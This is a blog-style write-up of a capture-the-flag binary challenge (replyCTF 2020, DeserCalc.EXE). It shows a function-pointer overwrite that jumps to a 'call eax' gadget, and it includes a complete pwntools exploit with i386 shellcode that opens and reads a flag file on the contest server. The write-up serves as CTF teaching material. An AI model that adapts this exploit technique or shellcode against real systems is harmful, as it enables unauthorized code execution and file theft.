---
layout: post
category: binary
title: replyCTF 2020 - DeserCalc.EXE
tags: 
    - hrshk
---

# Overview
This is the first binary(category) challenge worth 100 points. I used binary ninja for reversing purposes. We are provided with two binaries, a client and a server. I used pwntools, which is a great python library to easily connect to things.

The client binary is not needed to solve the challenge. The NX bit and RELOCS are disabled so we can use arbitrary shellcode. (more on this later).

First the binary first asks for a password, then compares the input to a string which is hardcoded into the challenge itself, which is `JustPwnThis!`.
It basically does some allocations and frees. Takes our user input two times. Also It stores a function pointer inside of our input buffer.
Since we can overwrite this pointer, we modify it to call an arbitrary address. I used: `0x08049019 #call eax`. A ROP gadget which I found using a tool called ROPgadget. Since EAX pointed to our input and the nx bit was disabled, we got shellcode execution. So we can now craft some shellcode.

I found out that the fd for I/O was always `4` on the remote. So i first opened `/proc/self/maps` to see which directory the flag might be in. Then I opened `/home/user/flag.txt`, I guessed the flag file name xD. And we got our flag.

Here is my exploit:
```python
#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import random

#exe
exe = ELF('./server')

#Gadgets
call_eax = 0x08049019

#Addr
mess = 0x0804A8C8
establish = 0x0804A06F
idk = 0x08049B9D
ret = 0x0804a8c7

#Exploit
if __name__ =='__main__':
#    p = process('./server')
    io = remote('gamebox1.reply.it',27364)

#    io = remote('localhost',8000)
    io.sendlineafter('Password: \n','JustPwnThis!')
    L_ROP = p32(call_eax)
    shellcode = asm(f'''
        mov eax,6
        mov ebx,1
        int 0x80
        mov eax, 0x29
        mov ebx, 0x4
        int 0x80
        mov al, 5
        mov ebx, esp
        add ebx, 0x3e+0x16+9
        mov ecx, 0
        int 0x80
        mov ebx, eax
        mov al,3
        mov ecx, esp
        add ecx, 0x100
        mov edx, 0x100
        int 0x80
        mov eax, 4
        mov ebx, 1
        int 0x80
    ''',arch='i386')

    io.sendlineafter('\x00',L_ROP+shellcode+b'/home/user/flag.txt')
    L_ROP = 'JUNK'
#    pause()
    io.sendlineafter('\x00',L_ROP)
    io.interactive()
```
